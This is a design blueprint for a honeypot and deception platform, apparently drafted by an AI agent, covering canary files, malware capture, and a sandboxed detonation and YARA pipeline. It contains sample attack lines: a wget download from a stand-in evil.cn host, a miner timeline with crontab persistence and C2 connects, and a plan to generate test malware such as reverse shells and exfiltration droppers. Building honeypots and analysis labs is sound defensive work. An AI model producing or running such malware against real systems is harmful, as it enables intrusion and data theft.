# STING 2.0 — Deception Platform Blueprint
**Version:** 2.0-DRAFT | **Date:** 2026-02-28 | **Author:** Falke AI

---

## 1. EVOLUTION: 1.0 → 2.0

```
STING 1.0 (current)          STING 2.0 (proposed)
─────────────────────         ──────────────────────────────────────
Cowrie logs → parse           Active deception layer (overlay FS)
→ analyze → alert             + Canary tokens + Malware capture
                              + Lab pipeline + Pattern analysis
                              + Full web UI + REST API
Passive observer              Active trap operator
```

---

## 2. ARCHITECTURE OVERVIEW

```
┌─────────────────────────────────────────────────────────────────────┐
│                         INTERNET / ATTACKERS                        │
└──────────────────────────────┬──────────────────────────────────────┘
                               │
              ┌────────────────▼────────────────┐
              │         TRAP LAYER (CT100)       │
              │  ┌──────────┐  ┌──────────────┐  │
              │  │  Cowrie  │  │  OverlayFS   │  │
              │  │ SSH/Tel  │  │  Fake Trees  │  │
              │  └────┬─────┘  └──────┬───────┘  │
              │       │  Canary Tokens │          │
              │       └───────┬────────┘          │
              └───────────────┼───────────────────┘
                              │ events + captures
              ┌───────────────▼───────────────────┐
              │        STING BACKEND API           │
              │         (CT102: FastAPI)           │
              │  /trap  /canary  /samples          │
              │  /lab   /analyze /export           │
              └───────┬───────────────┬────────────┘
                      │               │
          ┌───────────▼──┐    ┌───────▼──────────┐
          │  STING UI    │    │   LAB PIPELINE   │
          │  (CT102:     │    │   (CT102:        │
          │   React)     │    │    isolated net) │
          │              │    │  Detonation +    │
          │  Dashboard   │    │  Behavior analysis│
          │  Trap Mgmt   │    │  Pattern extract │
          │  Sample View │    │  YARA generation │
          │  Lab Results │    └──────────────────┘
          └──────────────┘
```

---

## 3. COMPONENTS

### 3.1 Trap Layer (OverlayFS + Canaries)

The deception surface — what attackers see and touch.

```
OVERLAYFS DESIGN:
                                                
  Real FS (lower layer, read-only)              
  ┌─────────────────────────────┐               
  │ /etc/passwd (real)          │               
  │ /var/www/html (real)        │               
  │ /home/admin/ (real)         │               
  └─────────────────────────────┘               
              +                                 
  Fake Layer (upper layer, trap content)        
  ┌─────────────────────────────┐               
  │ /home/admin/.ssh/keys  🍯  │ ← canary file 
  │ /root/secrets.txt      🍯  │ ← canary file 
  │ /var/backups/db.sql    🍯  │ ← canary file 
  │ /etc/shadow (fake)     🍯  │ ← fake creds  
  │ /opt/app/config.yaml   🍯  │ ← fake API key
  └─────────────────────────────┘               
              =                                 
  Attacker View (merged)                        
  ┌─────────────────────────────┐               
  │ Looks 100% like real system │               
  │ Every canary access logged  │               
  │ Every credential trapped    │               
  └─────────────────────────────┘               
```

**Canary Types:**

| Type | Trigger | Example |
|------|---------|---------|
| File canary | `open()` / `read()` syscall | `/root/secrets.txt` |
| Credential canary | Login attempt with fake creds | `admin:SuperSecret2024!` |
| URL canary | HTTP request to beacon URL | `http://trap.sting/beacon?id=X` |
| Doc canary | Open PDF/Office with embedded pixel | Fake invoice with tracking pixel |
| DNS canary | DNS lookup of unique subdomain | `id123.canary.sting.local` |
| Token canary | AWS key / API key beacon | Fake AWS access key |

### 3.2 Backend API (FastAPI)

**Base URL:** `http://CT102:8700/api/v1`

```
REST API STRUCTURE:

/api/v1/
├── /trap
│   ├── GET    /status          — trap health, active sessions
│   ├── POST   /canary          — deploy new canary
│   ├── DELETE /canary/{id}     — remove canary
│   ├── GET    /canaries        — list all canaries + hit stats
│   └── GET    /sessions        — active/recent attacker sessions
│
├── /events
│   ├── GET    /                — event stream (SSE / websocket)
│   ├── GET    /{id}            — single event detail
│   ├── GET    /search          — query events
│   └── GET    /stats           — aggregated statistics
│
├── /samples
│   ├── GET    /                — list captured malware samples
│   ├── GET    /{hash}          — sample detail + metadata
│   ├── POST   /submit          — manual sample submission
│   ├── GET    /{hash}/download — download sample (auth required)
│   └── DELETE /{hash}          — remove sample
│
├── /lab
│   ├── POST   /detonate/{hash} — trigger dynamic analysis
│   ├── GET    /jobs            — analysis queue + status
│   ├── GET    /results/{hash}  — analysis results
│   ├── GET    /patterns        — extracted behavior patterns
│   └── GET    /yara/{hash}     — generated YARA rule
│
├── /overlay
│   ├── GET    /status          — overlay FS mount status
│   ├── POST   /deploy          — push new fake file tree
│   ├── PUT    /file            — add/update fake file
│   └── DELETE /file            — remove fake file
│
└── /export
    ├── GET    /mitre/{hash}    — MITRE ATT&CK mapping
    ├── GET    /report/{hash}   — full PDF report
    └── GET    /ioc             — IOC feed (IPs, hashes, domains)
```

### 3.3 Frontend UI (Mockups)

```
╔══════════════════════════════════════════════════════════════════╗
║  ◈ STING  [ TRAP ] [ EVENTS ] [ SAMPLES ] [ LAB ] [ EXPORT ]   ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  THREAT MAP                    LIVE FEED                        ║
║  ┌──────────────────────┐      ┌───────────────────────────┐   ║
║  │   ·   ·  ●  ·    ·  │      │ 🔴 18:41 MALWARE_DL       │   ║
║  │  ·  ●      ·  ·     │      │    218.92.0.51 → miner.sh  │   ║
║  │    ·   ●  ·   ·  ·  │      │ 🟠 18:40 CANARY_HIT       │   ║
║  │  ·    ·      ●  ·   │      │    /root/secrets.txt read  │   ║
║  └──────────────────────┘      │ 🟡 18:39 BRUTE_FORCE      │   ║
║                                │    192.168.1.1 × 47 tries  │   ║
║  STATS (24h)                   │ 🔴 18:38 SUCCESS_LOGIN    │   ║
║  ┌──────────┬──────────┐       │    root / admin123        │   ║
║  │ Sessions │ 142      │       └───────────────────────────┘   ║
║  │ Captures │ 8        │                                        ║
║  │ Canaries │ 23 hits  │      CANARY STATUS                    ║
║  │ Samples  │ 3 new    │      ┌───────────────────────────┐   ║
║  └──────────┴──────────┘       │ /root/secrets.txt   5 🔴 │   ║
║                                │ /etc/shadow (fake)  12 🔴│   ║
║                                │ db_backup.sql        3 🟠│   ║
║                                │ aws_keys.conf        0 ⬜ │   ║
║                                └───────────────────────────┘   ║
╚══════════════════════════════════════════════════════════════════╝

SAMPLE DETAIL VIEW:
╔══════════════════════════════════════════════════════════════════╗
║  ◈ STING / SAMPLES / a1b2c3d4e5f6...                           ║
╠══════════════════════════════════════════════════════════════════╣
║  miner.sh                          [ DETONATE ] [ YARA ] [PDF] ║
║  ──────────────────────────────────────────────────────────────║
║  Captured:  2026-02-28 18:41 UTC                               ║
║  Source:    218.92.0.51 (CN, AS4134)                           ║
║  Vector:    wget http://evil.cn/miner.sh                       ║
║  SHA256:    a1b2c3d4...                                         ║
║  Size:      4.2 KB | Type: shell script                        ║
║                                                                  ║
║  BEHAVIOR (Lab Results)          MITRE ATT&CK                  ║
║  ┌────────────────────────┐      ┌──────────────────────────┐  ║
║  │ Network: 3 C2 connects │      │ T1059.004 Shell Script   │  ║
║  │ Files:   +2 created    │      │ T1496    Crypto Mining   │  ║
║  │ Procs:   5 spawned     │      │ T1105    Ingress Tool    │  ║
║  │ Persistence: cron job  │      │ T1053.003 Cron Job       │  ║
║  └────────────────────────┘      └──────────────────────────┘  ║
║                                                                  ║
║  EXTRACTED IOCs                                                  ║
║  ┌──────────────────────────────────────────────────────────┐  ║
║  │ 218.92.0.51          │ C2 server        │ 🚫 Block      │  ║
║  │ pool.minexmr.com     │ Mining pool      │ 🚫 Block      │  ║
║  │ /tmp/.x              │ Hidden process   │ 📋 Rule       │  ║
║  └──────────────────────────────────────────────────────────┘  ║
╚══════════════════════════════════════════════════════════════════╝

LAB ANALYSIS VIEW:
╔══════════════════════════════════════════════════════════════════╗
║  ◈ STING / LAB / Job #047                     ⣿⣿⣿⣿⣿⣿⣿⣿ 100% ║
╠══════════════════════════════════════════════════════════════════╣
║  TIMELINE                                                        ║
║  ──────────────────────────────────────────────────────────────║
║  00:00  [EXEC]    /bin/sh miner.sh                              ║
║  00:01  [NET]     DNS lookup: pool.minexmr.com → 45.63.xx.xx   ║
║  00:01  [FILE]    Created: /tmp/.xmrig                          ║
║  00:02  [NET]     TCP connect: 45.63.xx.xx:4444                 ║
║  00:02  [PROC]    Spawned: .xmrig --pool pool.minexmr.com       ║
║  00:03  [PERSIST] crontab -l | crontab - (added entry)          ║
║  00:03  [CLEANUP] rm -f miner.sh                                ║
║                                                                  ║
║  GENERATED YARA RULE                                             ║
║  ┌──────────────────────────────────────────────────────────┐  ║
║  │ rule STING_miner_a1b2 {                                  │  ║
║  │   strings:                                               │  ║
║  │     $s1 = "pool.minexmr.com"                            │  ║
║  │     $s2 = "/tmp/.xmrig"                                  │  ║
║  │     $s3 = "xmrig --pool"                                 │  ║
║  │   condition: 2 of them                                   │  ║
║  │ }                                                        │  ║
║  └──────────────────────────────────────────────────────────┘  ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## 4. MALWARE TRANSFER PIPELINE

The core innovation — seamless trap → lab handoff.

```
TRANSFER FLOW:

  TRAP ENV (CT100)              STING API              LAB ENV (CT102)
  ──────────────                ─────────              ───────────────
  Attacker uploads              Receives               Isolated Docker
  or downloads                  sample via             network (no
  malware.sh                    audit hook             internet access)
       │                              │                      │
       ▼                              ▼                      ▼
  [1] CAPTURE                  [2] QUARANTINE          [3] DETONATE
  fanotify/inotify             Hash + sign             Spin up clean
  intercepts file              Store in                container from
  write to FS                  samples/ dir            base image
       │                              │                      │
       ▼                              ▼                      ▼
  [4] METADATA                 [5] ENRICH              [6] ANALYZE
  Source IP,                   VirusTotal API          strace -e all
  session ID,                  (optional)              tcpdump
  timestamp,                   File type               ltrace
  vector (wget/curl)           Entropy score           procmon
       │                              │                      │
       ▼                              ▼                      ▼
  [7] ALERT                    [8] STORE               [9] REPORT
  Telegram: new                SQLite +                Pattern extract
  sample captured              file storage            YARA rule gen
                                                       MITRE mapping
                                                       IOC export
```

### Transfer Security

```
Sample bundle (encrypted):
┌────────────────────────────────┐
│ manifest.json                  │
│   sha256: "a1b2c3..."          │
│   size: 4200                   │
│   source_ip: "218.92.0.51"    │
│   captured_at: "2026-02-28..." │
│   vector: "wget"               │
├────────────────────────────────┤
│ sample.bin (AES-256 encrypted) │
├────────────────────────────────┤
│ signature (Ed25519)            │
└────────────────────────────────┘
```

---

## 5. LAB ENVIRONMENT

```
LAB NETWORK (isolated):

┌─────────────────────────────────────────────────────┐
│  STING LAB NETWORK (172.31.0.0/24, no route out)   │
│                                                     │
│  ┌──────────────────┐    ┌─────────────────────┐   │
│  │  VICTIM CONTAINER │    │  MONITORING SIDECAR │   │
│  │  (fresh base img) │    │                     │   │
│  │                  │───▶│  strace output      │   │
│  │  Malware runs    │    │  tcpdump capture    │   │
│  │  here in         │    │  inotify events     │   │
│  │  isolation       │    │  proc monitoring    │   │
│  │                  │    │  cgroup tracking    │   │
│  └──────────────────┘    └─────────────────────┘   │
│           │                        │                │
│           └───────────┬────────────┘                │
│                       │                             │
│              ┌────────▼────────┐                    │
│              │  FAKE SERVICES  │                    │
│              │  DNS resolver   │                    │
│              │  (logs queries) │                    │
│              │  HTTP server    │                    │
│              │  (logs requests)│                    │
│              │  SMTP sink      │                    │
│              └─────────────────┘                    │
└─────────────────────────────────────────────────────┘
         Results stream to STING API
```

**Analysis tools per container:**

| Tool | Purpose |
|------|---------|
| `strace -e trace=all` | All syscalls |
| `tcpdump -i any` | All network |
| `inotifywait` | File system changes |
| `ss -tlnp` | Port binds |
| `strings` | Static string extract |
| `entropy scan` | Packed/encrypted detection |
| YARA engine | Signature matching |

---

## 6. IMPLEMENTATION ROADMAP

### Phase 1 — Foundation (Week 1-2)
```
[ ] Backend API skeleton (FastAPI, CT102:8700)
[ ] Database schema (PostgreSQL — migrate from SQLite)
[ ] Frontend shell (React, CT102:8701)
[ ] Auth layer (JWT, single-user for now)
[ ] Wire existing Cowrie pipeline to new API
[ ] Basic event stream (WebSocket)
```

### Phase 2 — Canary System (Week 2-3)
```
[ ] OverlayFS deployment script (CT100)
[ ] Canary file management API
[ ] Canary hit detection (inotify + auditd)
[ ] Credential canary wiring (Cowrie fake-cred config)
[ ] URL canary beacon server
[ ] Canary dashboard UI
```

### Phase 3 — Sample Capture (Week 3-4)
```
[ ] fanotify capture hook on trap FS
[ ] Secure transfer bundle (AES + Ed25519)
[ ] Quarantine + hash dedup
[ ] VirusTotal enrichment (optional)
[ ] Sample browser UI
[ ] Manual submit endpoint
```

### Phase 4 — Lab Pipeline (Week 4-5)
```
[ ] Isolated Docker network setup
[ ] Victim container base image
[ ] Monitoring sidecar (strace/tcpdump)
[ ] Fake DNS/HTTP services
[ ] Analysis result parser
[ ] YARA rule generator
```

### Phase 5 — Intelligence (Week 5-6)
```
[ ] MITRE ATT&CK mapper
[ ] Pattern clustering (similar behaviors)
[ ] IOC export (JSON / STIX)
[ ] PDF report generator
[ ] Behavioral timeline UI
[ ] Real-time lab analysis stream
```

### Phase 6 — Production Test (Week 6-7)
```
[ ] Deploy on CT102 (dev)
[ ] Wire to CT100 (live Cowrie)
[ ] Test with malware-by-Falke (generated via Venice)
[ ] Tune detection thresholds
[ ] Load test (simulated attack campaign)
[ ] Harden API (rate limit, auth, input validation)
[ ] Deploy to prod (CT100 live, CT102 API+UI)
```

---

## 7. TECH STACK

| Layer | Tech | Why |
|-------|------|-----|
| Backend API | FastAPI (Python) | Matches existing codebase, async, OpenAPI auto-docs |
| Frontend | React + Vite | Fast, component-based |
| Database | PostgreSQL | Scales better than SQLite for concurrent writes |
| Real-time | WebSocket (native FastAPI) | Live event feed |
| Lab containers | Docker + custom network | Isolation, clean snapshots |
| Crypto | PyNaCl (Ed25519) | Sample signing |
| Deception FS | OverlayFS (kernel) | Zero-cost fake layer |
| Canary traps | fanotify + auditd | Reliable file access detection |
| Analysis | strace + Scapy + inotify | Standard Linux tools |
| YARA | yara-python | Industry standard |

---

## 8. STING-GENERATED MALWARE (TEST PLAN)

Before hitting real prod, test with Venice-generated malware:

```
Test samples to generate:
1. Shell dropper (wget + chmod + exec)
2. SSH key injector (persistence)  
3. Crypto miner (XMRig-style)
4. Port scanner + lateral movement
5. Data exfil (curl to C2)
6. Rootkit-lite (hide process via /proc manipulation)
7. Reverse shell (bash TCP)
8. Polymorphic wrapper (base64-encoded payload)

Each tested against STING trap → capture → lab → analysis.
Pass criteria: STING detects, captures, analyzes, maps to MITRE.
```

---

## 9. ENHANCEMENTS vs 1.0

| Feature | STING 1.0 | STING 2.0 |
|---------|-----------|-----------|
| Input | Cowrie logs only | OverlayFS + Cowrie + canaries |
| Output | Telegram alerts | Full dashboard + API + IOC export |
| Architecture | Script pipeline | Frontend + Backend + Lab |
| Malware handling | Log URL only | Capture + transfer + detonate |
| Analysis | Pattern matching | Dynamic behavioral analysis |
| Intelligence | None | MITRE mapping + YARA generation |
| Reusability | Internal only | API-first, exportable IOCs |

---

## 10. FIRST DEV SESSION TASKS

When Goran gives green light:
1. Spawn coder → CT102 tmux claude-code
2. `git checkout -b sting-2.0` in STING repo
3. Scaffold: `fastapi-app/`, `react-app/`, `lab/`
4. Week 1 deliverable: API health endpoint + event stream + basic React shell
5. Review → iterate

**Awaiting green light.**
